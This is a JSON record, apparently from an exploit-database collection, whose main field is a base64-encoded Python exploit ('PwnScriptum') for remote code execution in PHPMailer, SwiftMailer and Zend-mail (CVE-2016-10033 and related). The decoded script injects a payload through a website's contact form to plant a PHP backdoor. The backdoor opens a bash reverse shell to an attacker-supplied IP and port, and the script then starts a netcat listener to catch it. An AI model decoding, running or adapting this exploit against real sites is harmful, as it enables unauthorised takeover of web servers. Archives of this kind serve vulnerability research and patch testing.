{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9weXRob24NCg0KaW50cm8gPSAiIiJcMDMzWzk0bSANCiAgICBfXyAgICAgICAgICAgICAgICAgICAgIF9fICAgX18gIF9fICAgICAgICAgICBfXyAgICAgICAgICAgICAgICAgDQogICAvIC8gICBfX18gIF9fX18gX19fX18gXy8gLyAgLyAvIC8gL19fXyBfX19fX18vIC9fX19fXyAgX19fX19fX19fXw0KICAvIC8gICAvIF8gXC8gX18gYC8gX18gYC8gLyAgLyAvXy8gLyBfXyBgLyBfX18vIC8vXy8gXyBcLyBfX18vIF9fXy8NCiAvIC9fX18vICBfXy8gL18vIC8gL18vIC8gLyAgLyBfXyAgLyAvXy8gLyAvX18vICw8IC8gIF9fLyAvICAoX18gICkgDQovX19fX18vXF9fXy9cX18sIC9cX18sXy9fLyAgL18vIC9fL1xfXyxfL1xfX18vXy98X3xcX19fL18vICAvX19fXy8gIA0KICAgICAgICAgICAvX19fXy8gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCg0KDQpQSFBNYWlsZXIgLyBaZW5kLW1haWwgLyBTd2lmdE1haWxlciAtIFJlbW90ZSBDb2RlIEV4ZWN1dGlvbiBFeHBsb2l0DQoJCSAgICAgYS5rLmEgIlB3blNjcmlwdHVtIg0KDQogQ1ZFLTIwMTYtMTAwMzMgKyBDVkUtMjAxNi0xMDA0NSArIENWRS0yMDE2LTEwMDM0ICsgQ1ZFLTIwMTYtMTAwNzQNCg0KDQpUaGlzIFBvQyBleHBsb2l0IGFpbXMgdG8gZXhlY3V0ZSBhIHJldmVyc2Ugc2hlbGwgb24gdGhlIHRhcmdldCBpbiANCnRoZSBjb250ZXh0IG9mIHRoZSB3ZWItc2VydmVyIHVzZXIgdmlhIHZ1bG5lcmFibGUgUEhQIGVtYWlsIGxpYnJhcnkuDQoNCg0KRGlzY292ZXJlZCBhbmQgQ29kZWQgYnk6DQoNClwwMzNbMTszNG0gDQogRGF3aWQgR29sdW5za2kNCiBodHRwczovL2xlZ2FsaGFja2Vycy5jb20NCg0KIHQ6IEBkYXdpZF9nb2x1bnNraSBmb3IgdXBkYXRlcw0KXDAzM1swbQ0KXDAzM1s5NG0gDQpQLiQuIEZvciB0ZXN0aW5nIG9ubHkhIERvbid0IGJyZWFrIHRoZSBXZWIgOykgDQpcMDMzWzBtDQoiIiINCmluZm8gPSAiIiINCltWZXJzaW9uXQ0KTGltaXRlZCAodmVyLiAxLjApDQoNCltQb0MgVmlkZW9dDQpTZWUgdGhlIHRoZSBleHBsb2l0IGluIGFjdGlvbiBhdDoNCg0KaHR0cHM6Ly9sZWdhbGhhY2tlcnMuY29tL3ZpZGVvcy9QSFBNYWlsZXItRXhwbG9pdC1SZW1vdGUtQ29kZS1FeGVjLVZ1bG4tQ1ZFLTIwMTYtMTAwMzMtUG9DLmh0bWwNCg0KW0luZm9dDQpUaGlzIGV4cGxvaXQgdGFyZ2V0cyBhIGNvbW1vbiB3ZWJhcHAgY29tcG9uZW50IC0gQ29udGFjdCBGb3JtLiANCg0KSXQgY29tYmluZXMgcGF5bG9hZHMgZm9yIHRoZSBmb2xsb3dpbmcgdnVsbnM6DQoNCjEuIFBIUE1haWxlciA8IDUuMi4xOCBSZW1vdGUgQ29kZSBFeGVjdXRpb24gKENWRS0yMDE2LTEwMDMzKQ0KaHR0cHM6Ly9sZWdhbGhhY2tlcnMuY29tL2Fkdmlzb3JpZXMvUEhQTWFpbGVyLUV4cGxvaXQtUmVtb3RlLUNvZGUtRXhlYy1DVkUtMjAxNi0xMDAzMy1WdWxuLmh0bWwNCg0KMi4gUEhQTWFpbGVyIDwgNS4yLjIwIFJlbW90ZSBDb2RlIEV4ZWN1dGlvbiAoQ1ZFLTIwMTYtMTAwNDUgLyBlc2NhcGVzaGVsbCBieXBhc3MpDQpodHRwczovL2xlZ2FsaGFja2Vycy5jb20vYWR2aXNvcmllcy9QSFBNYWlsZXItRXhwbG9pdC1SZW1vdGUtQ29kZS1FeGVjLUNWRS0yMDE2LTEwMDQ1LVZ1bG4uaHRtbA0KDQozLiBTd2lmdE1haWxlciA8PSA1LjQuNS1ERVYgUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDVkUtMjAxNi0xMDA3NCkNCmh0dHBzOi8vbGVnYWxoYWNrZXJzLmNvbS9hZHZpc29yaWVzL1N3aWZ0TWFpbGVyLUV4cGxvaXQtUmVtb3RlLUNvZGUtRXhlYy1DVkUtMjAxNi0xMDA3NC1WdWxuLmh0bWwNCg0KNC4gWmVuZCBGcmFtZXdvcmsgLyB6ZW5kLW1haWwgPCAyLjQuMTEgLSBSZW1vdGUgQ29kZSBFeGVjdXRpb24gKENWRS0yMDE2LTEwMDM0KQ0KaHR0cHM6Ly9sZWdhbGhhY2tlcnMuY29tL2Fkdmlzb3JpZXMvWmVuZEZyYW1ld29yay1FeHBsb2l0LVplbmRNYWlsLVJlbW90ZS1Db2RlLUV4ZWMtQ1ZFLTIwMTYtMTAwMzQtVnVsbi5odG1sDQoNCltVc2FnZV0NCg0KLi9Qd25TY3JpcHR1bV9SQ0VfZXhwbG9pdC5weSBbLWhdIC11cmwgV0VCQVBQX0JBU0VfVVJMIC1jZiBDT05UQUNUX1NDUklQVA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFstZCBUQVJHRVRfVVBfRElSXSAtaXAgQVRUQUNLRVJTX0lQDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWy1wIEFUVEFDS0VSU19QT1JUXSBbLS12ZXJzaW9uXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFstLXBvc3QtYWN0aW9uIFBPU1RfQUNUSU9OXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFstLXBvc3QtbmFtZSBQT1NUX05BTUVdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWy0tcG9zdC1lbWFpbCBQT1NUX0VNQUlMXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFstLXBvc3QtbXNnIFBPU1RfTVNHXQ0KDQpOb3RlLCBtYWtlIHN1cmUgdGhlIGNvbnRhY3QgZm9ybSBtYXRjaGVzIHRoZSBkZWZhdWx0IGZpZWxkIG5hbWVzIChzZW5kL25hbWUvZW1haWwvbXNnKS4gDQpPdGhlcndpc2Ugb3ZlcnJpZGUgd2l0aCAtLXBvc3QtbXNnPW1lc3NhZ2VfYm94IGZvciBleGFtcGxlLg0KDQoiIiINCg0KaW1wb3J0IG9zDQppbXBvcnQgYXJncGFyc2UNCmltcG9ydCB0aW1lDQppbXBvcnQgdXJsbGliDQppbXBvcnQgdXJsbGliMg0KaW1wb3J0IHNvY2tldA0KaW1wb3J0IHN5cw0KDQoNCiMgVGhlIE1haW4gTWVhdA0KcHJpbnQgaW50cm8NCg0KIyBTaG93IGluZm8NCmlmICctSCcgaW4gc3lzLmFyZ3Y6DQoJcHJpbnQgaW5mbw0KCWV4aXQoMCkNCiMgUGFyc2UgaW5wdXQgYXJncw0KcGFyc2VyID0gYXJncGFyc2UuQXJndW1lbnRQYXJzZXIocHJvZz0nUHduU2NyaXB0dW1fUkNFX2V4cGxvaXQucHknLCBkZXNjcmlwdGlvbj0nUEhQTWFpbGVyIC8gWmVuZC1tYWlsIC8gU3dpZnRNYWlsZXIgLSBSQ0UgRXhwbG9pdCAoYS5rLmEgXCdQd25TY3JpcHR1bVwnKVxuRGlzY292ZXJlZCBieSBEYXdpZCBHb2x1bnNraSAoaHR0cHM6Ly9sZWdhbGhhY2tlcnMuY29tKScpDQpwYXJzZXIuYWRkX2FyZ3VtZW50KCctSCcsIGFjdGlvbj0nc3RvcmVfdHJ1ZScsIGRlZmF1bHQ9ImZhbHNlIiwgcmVxdWlyZWQ9RmFsc2UsICAgIGhlbHA9J0Z1bGwgSGVscCAvIEluZm8gUGFnZScpDQpwYXJzZXIuYWRkX2FyZ3VtZW50KCctdXJsJywgZGVzdD0nV0VCQVBQX0JBU0VfVVJMJywgcmVxdWlyZWQ9VHJ1ZSwgIGhlbHA9J1dlYkFwcCBCYXNlIFVybCcpDQpwYXJzZXIuYWRkX2FyZ3VtZW50KCctY2YnLCAgZGVzdD0nQ09OVEFDVF9TQ1JJUFQnLCAgcmVxdWlyZWQ9VHJ1ZSwgIGhlbHA9J0NvbnRhY3QgRm9ybSBzY3JpcHRuYW1lJykNCnBhcnNlci5hZGRfYXJndW1lbnQoJy1kJyAsICBkZXN0PSdUQVJHRVRfVVBfRElSJywgICByZXF1aXJlZD1GYWxzZSwgaGVscD0nVGFyZ2V0IFVwbG9hZCBEaXInKQ0KcGFyc2VyLmFkZF9hcmd1bWVudCgnLWlwJywgIGRlc3Q9J0FUVEFDS0VSU19JUCcsICAgIHJlcXVpcmVkPVRydWUsICBoZWxwPSdBdHRhY2tlcnMgUHVibGljIElQIGZvciBSZXZTaGVsbCcpDQpwYXJzZXIuYWRkX2FyZ3VtZW50KCctcCcsICAgZGVzdD0nQVRUQUNLRVJTX1BPUlQnLCAgcmVxdWlyZWQ9RmFsc2UsIGhlbHA9J0F0dGFja2VycyBQb3J0IGZvciBSZXZTaGVsbCBsaXN0ZW5lcicpDQpwYXJzZXIuYWRkX2FyZ3VtZW50KCctLXZlcnNpb24nLCBhY3Rpb249J3ZlcnNpb24nLCB2ZXJzaW9uPSclKHByb2cpcyAxLjAgTGltaXRlZCBlZGl0aW9uJykNCnBhcnNlci5hZGRfYXJndW1lbnQoJy0tcG9zdC1hY3Rpb24nLCBkZXN0PSdQT1NUX0FDVElPTicsICByZXF1aXJlZD1GYWxzZSwgaGVscD0nT3ZlcnJpZGVzIFBPU1QgImFjdGlvbiIgZmllbGQgbmFtZScsICAgICAgICAgZGVmYXVsdD0ic2VuZCIpDQpwYXJzZXIuYWRkX2FyZ3VtZW50KCctLXBvc3QtbmFtZScsICAgZGVzdD0nUE9TVF9OQU1FJywgICAgcmVxdWlyZWQ9RmFsc2UsIGhlbHA9J092ZXJyaWRlcyBQT1NUICJuYW1lIG9mIHNlbmRlciIgZmllbGQgbmFtZScsIGRlZmF1bHQ9Im5hbWUiKQ0KcGFyc2VyLmFkZF9hcmd1bWVudCgnLS1wb3N0LWVtYWlsJywgIGRlc3Q9J1BPU1RfRU1BSUwnLCAgIHJlcXVpcmVkPUZhbHNlLCBoZWxwPSdPdmVycmlkZXMgUE9TVCAiZW1haWwiIGZpZWxkIG5hbWUnLCAgICAgICAgICBkZWZhdWx0PSJlbWFpbCIpDQpwYXJzZXIuYWRkX2FyZ3VtZW50KCctLXBvc3QtbXNnJywgICAgZGVzdD0nUE9TVF9NU0cnLCAgICAgcmVxdWlyZWQ9RmFsc2UsIGhlbHA9J092ZXJyaWRlcyBQT1NUICJtZXNzYWdlIiBmaWVsZCBuYW1lJywgICAgICAgIGRlZmF1bHQ9Im1zZyIpDQphcmdzID0gcGFyc2VyLnBhcnNlX2FyZ3MoKQ0KDQojIFByZXNldCB2YXJzDQpUTU9VVCA9IDMNCiMgU2V0IFZhcnMNCmlmIGFyZ3MuQVRUQUNLRVJTX1BPUlQgaXMgTm9uZToNCglhcmdzLkFUVEFDS0VSU19QT1JUID0gODA4MA0KaWYgYXJncy5UQVJHRVRfVVBfRElSICBpcyBOb25lOg0KCWFyZ3MuVEFSR0VUX1VQX0RJUiA9ICJ1cGxvYWQiDQojIEJ1aWxkIHRoZSB0YXJnZXQgYmFja2Rvb3IgVVJMIGhlcmUgKG5vdGUgdGhlICJyYW5kb20iIHBpZCBiaXQgdG8gYXZvaWQgcGhwIGNvZGUgY29sbGlzaW9ucyBvbiBtdWx0aXBsZSBydW5zIC8gbXVsdGlwbGUgcGhwZmlsZSBhcHBlbmRzIDspDQpCQUNLRE9PUl9GSUxFID0gJ3BocGJhY2tkb29yJyArIHN0cihvcy5nZXRwaWQoKSkgKyAnLnBocCcNCkJBQ0tET09SX1VSTCAgPSBhcmdzLldFQkFQUF9CQVNFX1VSTCArICcvJyArIGFyZ3MuVEFSR0VUX1VQX0RJUiArICcvJyArIEJBQ0tET09SX0ZJTEUNCkNPTlRBQ1RfU0NSSVBUX1VSTCA9IGFyZ3MuV0VCQVBQX0JBU0VfVVJMICsgYXJncy5DT05UQUNUX1NDUklQVA0KDQojIFNob3cgcGFyYW1zDQpwcmludCAiIiJbK10gU2V0dGluZyB2YXJzIHRvOiBcbg0KV0VCQVBQX0JBU0VfVVJMICAgICA9IFslc10NCkNPTlRBQ1RfU0NSSVBUICAgICAgPSBbJXNdDQpUQVJHRVRfVVBfRElSICAgICAgID0gWyVzXQ0KQVRUQUNLRVJTX0lQICAgICAgICA9IFslc10NCkFUVEFDS0VSU19QT1JUICAgICAgPSBbJXNdDQpDT05UQUNUX1NDUklQVF9VUkwgID0gWyVzXQ0KQkFDS0RPT1JfRklMRWwgICAgICA9IFslc10NCiIiIiAlIChhcmdzLldFQkFQUF9CQVNFX1VSTCwgYXJncy5DT05UQUNUX1NDUklQVCwgYXJncy5UQVJHRVRfVVBfRElSLCBhcmdzLkFUVEFDS0VSU19JUCwgYXJncy5BVFRBQ0tFUlNfUE9SVCwgQ09OVEFDVF9TQ1JJUFRfVVJMLCBCQUNLRE9PUl9GSUxFKQ0KDQoNCnByaW50ICJbK10gQ2hvb3NlIHlvdXIgdGFyZ2V0IC8gcGF5bG9hZDogIg0KcHJpbnQgIlwwMzNbMTszNG0iDQpwcmludCAiIiJbMV0gUEhQTWFpbGVyIDwgNS4yLjE4IFJlbW90ZSBDb2RlIEV4ZWN1dGlvbiAoQ1ZFLTIwMTYtMTAwMzMpXG4iIiINCnByaW50ICIiIlsyXSBQSFBNYWlsZXIgPCA1LjIuMjAgUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDVkUtMjAxNi0xMDA0NSkNCgkgICAgICAgIFRoZSBlc2NhcGVzaGVsbGFyZygpIGJ5cGFzcyA6KVxuIiIiDQpwcmludCAiIiJbM10gU3dpZnRNYWlsZXIgPD0gNS40LjUtREVWIFJlbW90ZSBDb2RlIEV4ZWN1dGlvbiAoQ1ZFLTIwMTYtMTAwNzQpXG4iIiINCnByaW50ICIiIls0XSBaZW5kIEZyYW1ld29yayAvIHplbmQtbWFpbCA8IDIuNC4xMSAtIFJlbW90ZSBDb2RlIEV4ZWN1dGlvbiAoQ1ZFLTIwMTYtMTAwMzQpXG4iIiINCnByaW50ICJcMDMzWzBtIg0KDQp0cnk6DQogICAgdGFyZ2V0ID0gaW50KHJhd19pbnB1dCgnWz9dIFNlbGVjdCB0YXJnZXQgWzEtMl06ICcpKQ0KZXhjZXB0IFZhbHVlRXJyb3I6DQogICAgcHJpbnQgIk5vdCBhIHZhbGlkIGNob2ljZS4gRXhpdGluZ1xuIg0KICAgIGV4aXQoMikNCmlmICh0YXJnZXQ+NCk6DQogICAgcHJpbnQgIk5vIHN1Y2ggdGFyZ2V0LiBFeGl0aW5nXG4iDQogICAgZXhpdCgzKQ0KaWYgdGFyZ2V0ID09IDE6DQoJIyBQSFBNYWlsZXIgPCA1LjIuMTggUmVtb3RlIENvZGUgRXhlY3V0aW9uIFBvQyBFeHBsb2l0IChDVkUtMjAxNi0xMDAzMykNCglwYXlsb2FkID0gJyJhdHRhY2tlclxcIiAtb1EvdG1wLyAtWCVzLyVzIHNvbWUiQGVtYWlsLmNvbScgJSAoYXJncy5UQVJHRVRfVVBfRElSLCBCQUNLRE9PUl9GSUxFKQ0KaWYgdGFyZ2V0ID09IDI6DQoJIyBCeXBhc3MgLyBQSFBNYWlsZXIgPCA1LjIuMjAgUmVtb3RlIENvZGUgRXhlY3V0aW9uIFBvQyBFeHBsb2l0IChDVkUtMjAxNi0xMDA0NSkNCglwYXlsb2FkID0gIlwiYXR0YWNrZXJcXCcgLW9RL3RtcC8gLVglcy8lcyAgc29tZVwiQGVtYWlsLmNvbSIgJSAoYXJncy5UQVJHRVRfVVBfRElSLCBCQUNLRE9PUl9GSUxFKQ0KaWYgdGFyZ2V0ID09IDM6DQoJIyBTd2lmdE1haWxlciA8PSA1LjQuNS1ERVYgUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDVkUtMjAxNi0xMDA3NCkNCiAgICAgICAgcGF5bG9hZCA9ICciYXR0YWNrZXJcXCIgLW9RL3RtcC8gLVglcy8lcyAiQGVtYWlsLmNvbScgJSAoYXJncy5UQVJHRVRfVVBfRElSLCBCQUNLRE9PUl9GSUxFKQ0KaWYgdGFyZ2V0ID09IDQ6DQoJIyBaZW5kIEZyYW1ld29yayAvIHplbmQtbWFpbCA8IDIuNC4xMSAtIFJlbW90ZSBDb2RlIEV4ZWN1dGlvbiAoQ1ZFLTIwMTYtMTAwMzQpDQogICAgICAgIHBheWxvYWQgPSAnImF0dGFja2VyXFwiIC1vUS90bXAvIC1YJXMvJXMgIkBlbWFpbC5jb20nICUgKGFyZ3MuVEFSR0VUX1VQX0RJUiwgQkFDS0RPT1JfRklMRSkNCg0KcHJpbnQgIlxuWytdIEdlbmVyYXRlZCBtYWlsKCkgcGF5bG9hZCB3aWxsIHVwbG9hZCB0aGUgYmFja2Rvb3IgaW50byB0aGUgJyVzJyBkaXJcbiIgJSBhcmdzLlRBUkdFVF9VUF9ESVINCiMgUEhQIFJDRSBjb2RlIHRvIGJlIHNhdmVkIGludG8gdGhlIGJhY2tkb29yIHBocCBmaWxlIG9uIHRoZSB0YXJnZXQgaW4gVEFSR0VUX1VQX0RJUi4gRS5nOg0KIyBlLmc6IA0KI1JDRV9QSFBfQ09ERSA9ICI8P3BocCBwaHBpbmZvKCk7ID8+IiANClJDRV9QSFBfQ09ERSA9ICIiIjw/cGhwIHNsZWVwKCVkKTsgc3lzdGVtKCIvYmluL2Jhc2ggLWMgJ25vaHVwIGJhc2ggLWkgPi9kZXYvdGNwLyVzLyVzIDA8JjEgMj4mMScgIik7ICA/PiIiIiAlIChUTU9VVCwgYXJncy5BVFRBQ0tFUlNfSVAsIGFyZ3MuQVRUQUNLRVJTX1BPUlQpIA0KDQojIFRoZSBmb3JtIG5hbWVzIG1pZ2h0IG5lZWQgdG8gYmUgYWRqdXN0ZWQNCnBvc3RfZmllbGRzID0geydhY3Rpb24nOiAiJXMiICUgYXJncy5QT1NUX0FDVElPTiwgIiVzIiAlIGFyZ3MuUE9TVF9OQU1FOiAnSmFzIEZhc29sYScsICIlcyIgJSBhcmdzLlBPU1RfRU1BSUw6IHBheWxvYWQsICIlcyIgJSBhcmdzLlBPU1RfTVNHOiBSQ0VfUEhQX0NPREV9DQoNCiMgQXR0YWNrDQojIEluamVjdCBwYXlsb2FkIGludG8gUEhQTWFpbGVyIC8gbWFpbCgpIHZpYSBhIENvbnRhY3QgZm9ybS4gVGhpcyBzaG91bGQgd3JpdGUgb3V0IHRoZSBiYWNrZG9vcg0KcHJpbnQgIlsrXSBCYWNrZG9vciB1cGxvYWQgdmlhIHRoZSBjb250YWN0IGZvcm0gYXQgJyVzJ1xuIiAlIENPTlRBQ1RfU0NSSVBUX1VSTA0KZGF0YSA9IHVybGxpYi51cmxlbmNvZGUocG9zdF9maWVsZHMpDQpyZXEgPSB1cmxsaWIyLlJlcXVlc3QoQ09OVEFDVF9TQ1JJUFRfVVJMLCBkYXRhKQ0KcmVzcG9uc2UgPSB1cmxsaWIyLnVybG9wZW4ocmVxKQ0KdGhlX3BhZ2UgPSByZXNwb25zZS5yZWFkKCkNCg0KDQojIENoZWNrIGlmIHRoZSBiYWNrZG9vciB3YXMgdXBsb2FkZWQgY29ycmVjdGx5Lg0KIyBBIGxpdHRsZSB0cmljayBoZXJlLiBUaGUgdXJsb3BlbiBzaG91bGQgdGltZW91dCBhdCBzbGVlcChYKS0xIGlmIHRoZSBiYWNrZG9vciByYW4gZmluZQ0KIyBTbyB3ZSBjYXRjaCB0aGUgdGltZW91dCB0byBmaW5kIG91dC4NCg0KIyBJcyBpdCB1cGxvYWRlZCA/IFRyeSB0byBleGVjdXRlIHRoZSBQSFAgYmFja2Rvb3IgYW5kIHRoZSBSZXZlcnNlIFNoZWxsIHdpdGhpbiBpdA0KcHJpbnQgIlsrXSBDaGVja2luZyBmb3IgdGhlIGJhY2tkb29yIGF0IHRoZSBVUkwgJyVzJ1xuIiAlIEJBQ0tET09SX1VSTA0KZ290X3RpbWVvdXQgPSAwDQpodHRwX2VyciA9IDANCnRyeToNCiAgICB1cmxsaWIyLnVybG9wZW4oQkFDS0RPT1JfVVJMLCB0aW1lb3V0ID0gKFRNT1VULTEpKQ0KZXhjZXB0IHVybGxpYjIuSFRUUEVycm9yIGFzIGU6DQogICAgaHR0cF9lcnIgPSBlLmNvZGUNCmV4Y2VwdCBzb2NrZXQudGltZW91dCBhcyBlOg0KICAgIHByaW50ICJbKl0gXDAzM1sxOzMybUxvb2tpbmcgZ29vZCFcMDMzWzBtIFRoZSBzbGVlcCgpIHdvcmtlZCBieSB0aGUgbG9va3Mgb2YgaXQgOikgXG5VcmxvcGVuIHRpbWVkIG91dCBqdXN0IGluIHRpbWUgZm9yIHRoZSBzaGVsbCA6KVxuIg0KICAgIGdvdF90aW1lb3V0ID0gMQ0KDQppZiAoZ290X3RpbWVvdXQgIT0gMSk6DQogICAgcHJpbnQgIlshXSBTb21ldGhpbmcgd2VudCB3cm9uZy4uLiBHb3QgZXJyb3I6IFslZF0gXG5UcnkgYW5vdGhlciBkaXI/IFB1c2ggdGhyb3VnaCwgZG9uJ3QgZ2l2ZSB1cCEgOilcbiIgJSBodHRwX2Vycg0KICAgIGV4aXQoMikNCg0KIyBTcGF3biB0aGUgc2hlbGwgYW5kIHdhaXQgZm9yIHRoZSBzbGVlcCgpIFBIUCBjYWxsIHRvIGZpbmlzaCBiZWZvcmUgL2Jpbi9iYXNoIGlzIGNhbGxlZA0KcHJpbnQgIlsrXSBXZSBzaG91bGQgZ2V0IGEgc2hlbGwgaWYgd2UgZ290IHRpbGwgaGVyZSEgU3Bhd25pbmcgbmV0Y2F0IG5vdyEgOilcbiINCnByaW50ICJbK10gXDAzM1sxOzM0bVBsZWFzZSB0ZWxsIG1lIHlvdSdyZSBzZWVpbmcgdGhpcyB0b28uLi4gOylcMDMzWzBtXG4iDQpvcy5zeXN0ZW0oIm5jIC12IC1sIC1wICVkIiAlIGFyZ3MuQVRUQUNLRVJTX1BPUlQpDQoNCnByaW50ICJcblsrXSBTaGVsbCBjbG9zZWRcbiINCg0KcHJpbnQgIlwwMzNbMTszNG1QLiQuIFRoZXJlJ3MgbW9yZSB0byBpdCA6KSBFeGl0aW5nLCBmb3Igbm93Li4uXDAzM1swbVxuIg==", 
    "filename": "platforms/php/webapps/40986.py", 
    "id": "40986", 
    "cves": [
        "CVE-2016-10074", 
        "CVE-2016-10034", 
        "CVE-2016-10033", 
        "CVE-2016-10045"
    ]
}